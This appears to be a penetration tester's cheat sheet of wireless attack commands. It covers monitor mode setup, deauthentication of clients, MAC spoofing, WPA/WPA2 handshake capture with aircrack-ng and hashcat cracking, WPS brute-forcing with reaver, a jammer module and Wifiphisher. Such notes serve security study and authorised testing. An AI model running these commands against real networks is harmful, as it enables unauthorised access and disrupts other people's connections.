# Wireless Attacks

WIRELESS ATTACKS

  
 iwconfig  
 iwconfig eth0 channel 3

 airmon-ng start wlan0  
 airmon-ng check kill  
 airodump-ng wlan0mon

 airmon-ng stop wlan0mon ==&gt; to reset to wlan0 when done  
 service network-manager restart  
 service NetworkManager restart  
 service avahi-daemon restart

 aireplay-ng -9 wlan0mon - test for packet injection

 Kismet

 aireplay-ng -0 10 -a 50:C7:BF:A8:A2:D0 -c 10:F1:F2:86:AE:1B wlanmon0

* --deauth attack

  
 --bypass MAC and open auth  
 macchanger wlan0mon -e =&gt; change mac keeping device ID

ATTACKING WPA AND WPA2

airodump-ng wlan0mon  
 -capture traffic between ap and client:

* airodump-ng --bssid&lt;MAC Address&gt; -c 1 --write /root/Desktop/nameofthewifi wlan0mon
* aireplay-ng -deauth 11 -a &lt;MAC Address&gt; wlan0mon
* use aircrack to break key - aircrack-ng-w passwordlist -b BSSID /root/Desktop/Wifi/nameofthewifi.cap

  
 -convert .cap to hashcat - ./cap2hccapx.bin input.pcap output.hccapx \[filtering by essid\] \[additional network essid: bssid\]

 -run hashcat

* hashcat --force -a 0 -m 2500 /root/lnawireless.hccapx /root/lna.txt

 --REAVER--  
 - use wash for finding vulnerable network

* wash -i wlan0 --ignore-fcs
* reaver -i wlan0 -b \(BBSID\) -vv

  
 --WEBSPLOIT--  
 wifi/wifi\_jammer module

 --WIFIPHISHER--

